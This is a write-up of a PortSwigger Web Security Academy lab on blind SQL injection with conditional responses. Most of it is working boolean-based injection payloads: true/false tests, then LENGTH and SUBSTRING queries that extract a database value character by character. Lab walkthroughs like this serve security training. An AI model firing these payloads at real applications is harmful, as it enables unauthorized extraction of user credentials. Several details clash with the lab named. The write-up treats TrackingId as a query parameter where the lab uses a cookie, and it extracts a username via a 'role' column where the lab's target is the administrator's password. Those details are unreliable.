# Blind SQL Injection with Conditional Responses (PortSwigger Lab)

## **Lab: Blind SQL Injection with Conditional Responses - Analysis**

#### **Lab URL**

[https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

***

### **High-Level Summary**

1. **Objective**: Exploit a **Blind SQL Injection (SQLi)** vulnerability where results are not directly visible but can be inferred through **conditional responses**.
2. **Vulnerability**: The application constructs SQL queries that rely on user input without proper sanitization, allowing attackers to manipulate the logic using **boolean-based SQLi**.
3. **Exploitation**:
   * Modify the `TrackingId` parameter to create **true/false conditions**.
   * Observe changes in HTTP responses (e.g., response length, different messages) to extract database information.
   * Identify the administrator's username by systematically guessing characters.

***

### **Testing for SQL Injection via Conditional Responses**

#### **Step 1: Identifying the Vulnerability**

1. Log in to the lab and observe requests in **Burp Suite**.
2.  Locate the request containing the `TrackingId` parameter:

    ```http
    GET /tracking?TrackingId=xYZ123
    ```
3.  Modify `TrackingId` with a simple boolean-based SQLi test:

    ```http
    GET /tracking?TrackingId=xYZ123' AND '1'='1 -- -
    ```
4.  If the response is **identical**, test with a false condition:

    ```http
    GET /tracking?TrackingId=xYZ123' AND '1'='2 -- -
    ```
5. If the response changes, the application is vulnerable to **Boolean-Based Blind SQLi**.

***

#### **Step 2: Extracting Information Character by Character**

**Extracting the Length of the Administrator Username**

1.  Use a **greater than/less than** approach to determine the length of the username:

    ```http
    GET /tracking?TrackingId=xYZ123' AND (SELECT LENGTH(username) FROM users WHERE role='administrator') > 5 -- -
    ```
2. Increase or decrease the number `5` until the response changes.
3. Once the correct length is found, move on to extracting characters.

***

#### **Step 3: Extracting the Administrator Username**

1.  Start extracting characters one by one using **substring queries**:

    ```http
    GET /tracking?TrackingId=xYZ123' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE role='administrator') = 'a' -- -
    ```
2. Modify `'a'` and repeat until the correct first character is found.
3.  Move to the next character:

    ```http
    GET /tracking?TrackingId=xYZ123' AND (SELECT SUBSTRING(username,2,1) FROM users WHERE role='administrator') = 'd' -- -
    ```
4. Continue until the full administrator username is revealed.

***

### **Key Takeaways**

* **Blind SQLi does not return query results directly**, requiring boolean logic or time delays to infer information.
* **Boolean-based SQLi** works by using **true/false conditions** to compare responses.
* **Incremental character guessing** (e.g., using `SUBSTRING()`) allows extraction of database values one character at a time.

***

### **Additional Resources**

* [OWASP SQL Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
* [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)

***

This lab demonstrates the power of **Boolean-based SQL Injection** and the ability to extract sensitive data despite the lack of visible error messages.
